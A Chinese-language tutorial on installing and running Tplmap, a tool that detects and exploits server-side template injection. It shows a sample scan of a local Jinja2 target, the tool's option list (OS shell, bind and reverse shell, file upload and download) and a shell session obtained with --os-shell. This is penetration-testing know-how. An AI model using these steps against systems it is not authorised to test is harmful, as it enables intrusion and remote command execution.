# Tplmap使用教程

Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。  

## 安装

Tplmap运行需要python2的环境，使用python3会报错

- 获取源码：

```
git clone https://github.com/epinna/tplmap
```

![image-20210427093755854](https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210427093755854.png)

- 安装模组

在Tplmap目录下有一个名为`requirements.txt`的文本文件，写了需要的库，内容如下：

```
PyYAML==5.1.2certifi==2018.10.15chardet==3.0.4idna==2.8requests==2.22.0urllib3==1.24.1wsgiref==0.1.2
```

直接用`pip`安装指定的库

```
pip install -r requirements.txt
```

这样就安装完成了

## 用法

```
$ python tplmap.py -u 'http://127.0.0.1:5000/?name=1' [+] Tplmap 0.5    Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if GET parameter 'name' is injectable[+] Smarty plugin is testing rendering with tag '*'[+] Smarty plugin is testing blind injection[+] Mako plugin is testing rendering with tag '${*}'[+] Mako plugin is testing blind injection[+] Python plugin is testing rendering with tag 'str(*)'[+] Python plugin is testing blind injection[+] Tornado plugin is testing rendering with tag '{{*}}'[+] Tornado plugin is testing blind injection[+] Jinja2 plugin is testing rendering with tag '{{*}}'[+] Jinja2 plugin has confirmed injection with tag '{{*}}'[+] Tplmap identified the following injection point:   GET parameter: name  Engine: Jinja2  Injection: {{*}}  Context: text  OS: posix-linux  Technique: render  Capabilities:    Shell command execution: ok   Bind and reverse shell: ok   File write: ok   File read: ok   Code evaluation: ok, python code [+] Rerun tplmap providing one of the following options:     --os-shell                Run shell on the target    --os-cmd                Execute shell commands    --bind-shell PORT            Connect to a shell bind to a target port    --reverse-shell HOST PORT    Send a shell back to the attacker's port    --upload LOCAL REMOTE    Upload files to the server    --download REMOTE LOCAL    Download remote files
```

### 选项

```
Usage: python tplmap.py [options] 选项:  -h, --help          显示帮助并退出 目标:  -u URL, --url=URL   目标 URL  -X REQUEST, --re..  强制使用给定的HTTP方法 (e.g. PUT) 请求:  -d DATA, --data=..  通过POST发送的数据字符串 它必须作为查询字符串: param1=value1&param2=value2  -H HEADERS, --he..  附加标头 (e.g. 'Header1: Value1') 多次使用以添加新的标头  -c COOKIES, --co..  Cookies (e.g. 'Field1=Value1') 多次使用以添加新的Cookie  -A USER_AGENT, -..  HTTP User-Agent 标头的值  --proxy=PROXY       使用代理连接到目标URL 检测:  --level=LEVEL       要执行的代码上下文转义级别 (1-5, Default: 1)  -e ENGINE, --eng..  强制将后端模板引擎设置为此值  -t TECHNIQUE, --..  技术 R:渲染 T:基于时间的盲注 Default: RT 操作系统访问:  --os-cmd=OS_CMD     执行操作系统命令  --os-shell          提示交互式操作系统Shell  --upload=UPLOAD     上传本地文件到远程主机  --force-overwrite   上传时强制覆盖文件  --download=DOWNL..  下载远程文件到本地主机  --bind-shell=BIN..  在目标的TCP端口上生成系统Shell并连接到它  --reverse-shell=..  运行系统Shell并反向连接到本地主机端口 模板检查:  --tpl-shell         在模板引擎上提示交互式Shell  --tpl-code=TPL_C..  在模板引擎中注入代码 常规:  --force-level=FO..  强制将测试级别设置为此值  --injection-tag=..  使用字符串作为注入标签 (default '*')
```

通常使用`--os-shell`来反弹shell来控制靶机

```
[+] Run commands on the operating system.posix-linux $ whoamijohn
```